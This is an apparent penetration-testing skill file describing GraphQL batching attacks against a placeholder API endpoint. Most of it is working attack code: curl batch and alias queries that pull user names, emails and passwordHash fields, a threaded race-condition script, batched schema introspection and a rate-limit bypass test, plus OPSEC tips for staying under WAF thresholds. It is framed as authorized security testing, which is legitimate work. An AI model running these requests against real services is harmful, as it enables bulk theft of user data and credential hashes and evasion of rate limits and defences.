---
name: graphql-batching
description: Test GraphQL batching attacks, alias-based abuse, and race conditions
version: 1.0.0
phase: recon
category: api
tags: [graphql, api, batching, race-condition]
tools: [curl, python3]
difficulty: advanced
opsec_level: medium
time_estimate: 60s
severity_if_found: critical
related_skills:
  - graphql-depth
  - hidden-endpoints
mitre_attack:
  - T1595.004
  - T1530
---

## When to Use

Use this skill to exploit GraphQL batching capabilities for data exfiltration,
rate-limit bypass, and race condition detection. GraphQL batching allows multiple
queries in a single request — if unthrottled, an attacker can extract large datasets
or bypass brute-force protections by bundling operations.

## Prerequisites

- curl
- python3 (for crafting batched payloads)
- Target GraphQL endpoint (detect via `/graphql`, `/v1/graphql`, `/api`, etc.)
- **Authorization** for any authenticated batching tests

## Procedure

```bash
TARGET="https://api.target.com/graphql"
AUTH="Authorization: Bearer <token>"

# 1. Standard batch query — test if the endpoint accepts JSON arrays
echo 'Standard Batch — multiple queries as JSON array:'
curl -sk "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d '[{"query":"query { user(id:1) { name email } }"},
          {"query":"query { user(id:2) { name email } }"},
          {"query":"query { user(id:3) { name email } }"}]' \
     | python3 -m json.tool 2>/dev/null

# 2. Alias-based batching — detect field-level batch abuse in a single query
echo 'Alias Batch — multiply fields under aliases:'
curl -sk "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d '{"query":"query Batch {
       u1: user(id:1) { name email role }
       u2: user(id:2) { name email role }
       u3: user(id:3) { name email role }
       u4: user(id:4) { name email role }
       u5: user(id:5) { name email role }
       u10: user(id:10) { name email role passwordHash }
       u100: user(id:100) { name email role }
       u1000: user(id:1000) { name email role }
     }"}' \
     | python3 -m json.tool 2>/dev/null

# 3. Race condition via batching — concurrent batch requests
echo 'Race Condition — parallel batch requests:'
python3 -c "
import requests, threading, json, sys

url = '$TARGET'
headers = {'Content-Type': 'application/json', '$AUTH'}

def send_batch(start):
    payload = [{'query': f'query {{ user(id:{i}) {{ name email role }} }}'} for i in range(start, start+5)]
    r = requests.post(url, json=payload, headers=headers, timeout=10)
    print(f'Batch {start}: {r.status_code} | {len(r.json()) if r.ok else 0} results', flush=True)

threads = [threading.Thread(target=send_batch, args=(i*5,)) for i in range(4)]
for t in threads: t.start()
for t in threads: t.join()
"

# 4. Batch introspection — extract schema via batched introspection queries
echo 'Batch Introspection — schema extraction:'
curl -sk "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d '[{"query":"query { __schema { types { name } } }"},
          {"query":"query { __schema { queryType { fields { name } } } }"},
          {"query":"query { __schema { mutationType { fields { name } } } }"}]' \
     | python3 -m json.tool 2>/dev/null

# 5. Rate-limit bypass test — batch vs single request comparison
echo 'Rate-Limit Bypass — compare single vs batch:'
# Send 50 individual queries
start_time=$(date +%s%N)
for i in $(seq 1 50); do
    curl -sk -o /dev/null -w "%{http_code} " "$TARGET" \
         -H "Content-Type: application/json" \
         -H "$AUTH" \
         -d "{\"query\":\"query { user(id:$i) { id } }\"}" &
done
wait
end_time=$(date +%s%N)
single_elapsed=$(( (end_time - start_time) / 1000000 ))

# Send 1 batch with 50 queries
start_time=$(date +%s%N)
batch_payload=$(python3 -c "
import json
queries = [{'query': f'query {{ user(id:{i}) {{ id }} }}'} for i in range(50)]
print(json.dumps(queries))
")
curl -sk -o /dev/null -w "%{http_code}" "$TARGET" \
     -H "Content-Type: application/json" \
     -H "$AUTH" \
     -d "$batch_payload"
end_time=$(date +%s%N)
batch_elapsed=$(( (end_time - start_time) / 1000000 ))

echo "Single queries: ${single_elapsed}ms"
echo "Batch query:    ${batch_elapsed}ms"
echo "Bypass factor:  $(( single_elapsed / (batch_elapsed + 1) ))x"
```

## OPSEC Rules

- Do NOT send batched authentication attempts (password guessing via batching)
- Limit batch size to 50 items per request to avoid WAF triggers
- Use a 100-500ms delay between batch rounds
- For race-condition tests, limit concurrent threads to 4
- Never include passwordHash or sensitive fields in results without explicit authorization

## Verification

- Confirm batch responses contain data for all queried items (not just the first)
- Compare response times — significant speedup over individual requests confirms batching
- For alias-based batching, check that all aliases return unique data
- Verify rate-limit bypass by confirming 50 queries in a single request vs. 50 individual
- Re-test with authentication to confirm batch access to out-of-scope resources

## Pitfalls

- Some GraphQL frameworks (Apollo, Yoga) require explicit batching enablement
- Batching may be disabled at the gateway or load balancer level
- Alias-based batching usually cannot be disabled separately from single-query depth limits
- Response sizes for large batches may exceed default curl buffers — use `--max-filesize` with care
- Race condition tests may cause database deadlocks or service degradation
- Batching findings may be WAF-triggered by the batch request size itself

## Output Format

```
[BATCHING ENABLED] JSON array batch — 200 / 50 results returned
  Endpoint: https://api.target.com/graphql
  Batch type: standard (JSON array)
  Data extracted: 50 user records (id, name, email)
  Rate limit bypass factor: 45x (200ms batch vs 9100ms single)
  Severity: HIGH

[ALIAS BATCHING] 7 user records via field aliases
  Endpoint: https://api.target.com/graphql
  Includes passwordHash field on user(id:10)
  Severity: CRITICAL — sensitve data exposure via batching

[RACE CONDITION] None detected
  Reason: All batched responses consistent, no duplicate mutations observed
```
